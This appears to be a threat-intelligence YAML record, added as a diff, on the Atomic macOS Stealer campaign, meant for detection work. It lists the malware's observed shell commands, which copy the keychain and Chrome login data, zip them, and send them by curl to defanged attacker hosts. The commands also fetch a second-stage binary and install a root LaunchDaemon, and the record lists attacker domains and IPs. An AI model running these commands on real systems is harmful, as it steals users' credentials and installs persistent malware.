@@ -1,0 +1,169 @@
+description: Atomic macOS Stealer (AMOS) is a macOS malware that steals credentials,
+  browser data, cryptocurrency wallets and exfiltrates the collected data via HTTP/HTTPS
+  to attacker-controlled servers.
+attribution: Unknown threat actor
+malware_families:
+- Atomic macOS Stealer (AMOS)
+- AMOS
+TTPs:
+  processes:
+  - sh
+  - osascript
+  - curl
+  - security
+  - launchctl
+  - .agent
+  - .helper
+  - com.finder.helper.plist
+  commandline:
+  - sh -c mkdir -p '/tmp/9556'
+  - sh -c cat '/tmp/.pass'
+  - sh -c dscl . authonly '<username' '<password>'
+  - sh -c cat '/Users/<username>/Library/Keychains/login.keychain-db' > '/tmp/9556/keychain'
+  - sh -c mkdir -p '/tmp/9556/FileGrabber'
+  - sh -c dirname '/tmp/9556/FileGrabber/NoteStore.sqlite'
+  - sh -c dirname '/tmp/9556/FileGrabber/NoteStore.sqlite-wal'
+  - sh -c dirname '/tmp/9556/FileGrabber/Cookies.binarycookies'
+  - sh -c mkdir -p '/tmp/9556/Chromium/Chrome_Profile 1'
+  - sh -c cat '/Users/<username>/Library/Application Support/Google/Chrome/Profile
+    1/Cookies' > '/tmp/9556/Chromium/Chrome_Profile 1/Cookies'
+  - sh -c cat '/Users/<username>/Library/Application Support/Google/Chrome/Profile
+    1/Web Data' > '/tmp/9556/Chromium/Chrome_Profile 1/Web Data'
+  - sh -c cat '/Users/<username>/Library/Application Support/Google/Chrome/Profile
+    1/Login Data' > '/tmp/9556/Chromium/Chrome_Profile 1/Login Data'
+  - sh -c mkdir -p '/tmp/9556/Chromium/Chrome_Default'
+  - sh -c ditto -c -k --sequesterRsrc /tmp/9556/ /tmp/out.zip
+  - 'sh -c curl -X POST -H "user: 7/zIoa7MzoMYLytAWL6uB2aVsrPUdM3alLmJBslWLnQ=" -H
+    "BuildID: rZStKjPMpx2u/16LDErtQ1sXFpE-pMw9nN9b15ThSRI=" -H "cl: 0" -H "cn: 0"
+    -F "file=@/tmp/out.zip" hxxps://sivvino[.]com/contact'
+  - 'sh -c curl -X POST -H "user: KuAr4/4-zWy4p0EXfGz6DAz5iiGWVOpD991d7y-FEIQ=" -H
+    "BuildID: DonL9YzJXELy0ljJ-Y5vjL4A5sNLw6grnB6QerroNxg=" -H "cl: 0" -H "cn: 0"
+    -F "file=@/tmp/out.zip" hxxp://45[.]94.47.186/contact'
+  - sh -c rm -f /Users/<username>/.username
+  - sh -c rm -f /Users/<username>/.pass
+  - sh -c curl -o '/Users/<username>/.helper' hxxps://halesmp[.]com/zxc/app
+  - sh -c chmod +x '/Users/<username>/.helper'
+  - sh -c chmod +x '/Users/<username>/.agent'
+  - sh -c echo '<password>' | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
+  - sh -c echo '<password>' | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
+  - sh -c echo '<password>' | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
+  - sh -c rm /tmp/out.zip
+  - sh -c curl -s -X POST hxxp://45[.]94[.]47.149/api/join/ -d '7/zIoa7MzoMYLytAWL6uB2aVsrPUdM3alLmJBslWLnQ='
+  - sh -c curl -s 'hxxp://45[.]94[.]47.149/api/tasks/V5/Qi950YteN3kMkuf52ww=='
+  - curl -s hxxp://45[.]94[.]47.149/api/tasks/V5/Qi950YteN3kMkuf52ww==
+  - security find-generic-password -a <username> -w
+  - '''sh -c mkdir -p ''/tmp/9556'''''
+  - '''sh -c cat ''/tmp/.pass'''''
+  - '''sh -c dscl . authonly ''<username'' ''<password>'''''
+  - '''sh -c cat ''/Users/<username>/Library/Keychains/login.keychain-db'' > ''/tmp/9556/keychain'''''
+  - '''sh -c mkdir -p ''/tmp/9556/FileGrabber'''''
+  - '''sh -c dirname ''/tmp/9556/FileGrabber/NoteStore.sqlite'''''
+  - '''sh -c dirname ''/tmp/9556/FileGrabber/NoteStore.sqlite-wal'''''
+  - '''sh -c dirname ''/tmp/9556/FileGrabber/Cookies.binarycookies'''''
+  - '''sh -c mkdir -p ''/tmp/9556/Chromium/Chrome_Profile 1'''''
+  - '''sh -c cat ''/Users/<username>/Library/Application Support/Google/Chrome/Profile
+    1/Cookies'' > ''/tmp/9556/Chromium/Chrome_Profile 1/Cookies'''''
+  - '''sh -c cat ''/Users/<username>/Library/Application Support/Google/Chrome/Profile
+    1/Web Data'' > ''/tmp/9556/Chromium/Chrome_Profile 1/Web Data'''''
+  - '''sh -c cat ''/Users/<username>/Library/Application Support/Google/Chrome/Profile
+    1/Login Data'' > ''/tmp/9556/Chromium/Chrome_Profile 1/Login Data'''''
+  - '''sh -c mkdir -p ''/tmp/1552/Chromium/Chrome_Default'''''
+  - '''sh -c ditto -c -k --sequesterRsrc /tmp/9556/ /tmp/out.zip'''
+  - '''sh -c curl -X POST -H "user: 7/zIoa7MzoMYLytAWL6uB2aVsrPUdM3alLmJBslWLnQ="
+    -H "BuildID: rZStKjPMpx2u/16LDErtQ1sXFpE-pMw9nN9b15ThSRI=" -H "cl: 0" -H "cn:
+    0" -F "file=@/tmp/out.zip" hxxps://sivvino[.]com/contact'''
+  - '''sh -c curl -X POST -H "user: KuAr4/4-zWy4p0EXfGz6DAz5iiGWVOpD991d7y-FEIQ="
+    -H "BuildID: DonL9YzJXELy0ljJ-Y5vjL4A5sNLw6grnB6QerroNxg=" -H "cl: 0" -H "cn:
+    0" -F "file=@/tmp/out.zip" hxxp://45[.]94.47.186/contact'''
+  - '''sh -c rm -f /Users/<username>/.username'''''
+  - '''sh -c rm -f /Users/<username>/.pass'''''
+  - '''sh -c curl -o ''/Users/<username>/.helper'' hxxps://halesmp[.]com/zxc/appDownload'''
+  - '''sh -c chmod +x ''/Users/<username>/.helper'''''
+  - '''sh -c chmod +x ''/Users/<username>/.agent'''''
+  - '''sh -c echo ''<password>'' | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist'''
+  - '''sh -c echo ''<password>'' | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist'''
+  - '''sh -c echo ''<password>'' | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist'''
+  - '''sh -c rm /tmp/out.zip'''''
+  - '''sh -c curl -s -X POST hxxp://45[.]94[.]47.149/api/join/ -d ''7/zIoa7MzoMYLytAWL6uB2aVsrPUdM3alLmJBslWLnQ='''''''
+  - '''sh -c curl -s ''hxxp://45[.]94[.]47.149/api/tasks/V5/Qi950YteN3kMkuf52ww=='''
+  - '''sh -c security find-generic-password -a <username> -w'''
+  powershell: []
+  scripting_engine:
+  - /tmp/update AppleScript content (checks for virtualization and exits with code
+    100 if detected)
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: sh
+    destination: hxxps://goatramz.com/get4/install.sh
+  - process: sh
+    destination: hxxps://letrucvert.com/get8/install.sh
+  - process: sh
+    destination: hxxps://sivvino.com/contact
+  - process: sh
+    destination: http://45.94.47.143/contact
+  - process: sh
+    destination: hxxp://45.94.47.186/contact
+  - process: sh
+    destination: hxxp://45.94.47.149/api/join/
+  - process: sh
+    destination: hxxp://45.94.47.149/api/tasks/V5/Qi950YteN3kMkuf52ww==
+  - process: .agent
+    destination: sivvino.com
+    port: ''
+  - process: .agent
+    destination: 45.94.47.186
+    port: ''
+  - process: .helper
+    destination: halesmp.com
+    port: ''
+  - process: .helper
+    destination: 45.94.47.149
+    port: ''
+  file_activity:
+  - /Users/<username>/Downloads/Installer_v.2.13.dmg
+  - /tmp/update
+  - /private/tmp/update
+  - /Users/<username>/.helper
+  - /Users/<username>/.agent
+  - /Library/LaunchDaemons/com.finder.helper.plist
+  - /tmp/out.zip
+  - /tmp/9556/keychain
+  - /tmp/9556/FileGrabber
+  persistence:
+  - LaunchDaemon com.finder.helper.plist
+  - .helper binary executed by .agent script
+  process_relations: []
+IOCs:
+  hashes:
+  - 41008d8a157784dfdde11cac20653b1af2ee8cd9
+  ips:
+  - 45.94.47.143
+  - 45.94.47.186
+  - 45.94.47.149
+  domains:
+  - sivvino.com
+  - goatramz.com
+  - letrucvert.com
+  - halesmp.com
+  - misshon.com
+  - haxmac.cc
+  - ekochist.com
+  urls:
+  - hxxps://goatramz.com/get4/install.sh
+  - hxxps://letrucvert.com/get8/install.sh
+  - hxxps://sivvino.com/contact
+  - http://45.94.47.143/contact
+  - hxxp://45.94.47.186/contact
+  - hxxp://45.94.47.149/api/join/
+  - hxxp://45.94.47.149/api/tasks/V5/Qi950YteN3kMkuf52ww==
+authors:
+- Buddy Tancio
+- Aldrin Ceriola
+- Khristoffer Jocson
+- Nusrath Iqra
+- Faith Higgins
+reference: https://www.trendmicro.com/en_us/research/25/i/an-mdr-analysis-of-the-amos-stealer-campaign.html
+date_of_publication: September 04, 2025
+file_creation_date: October 01, 2025
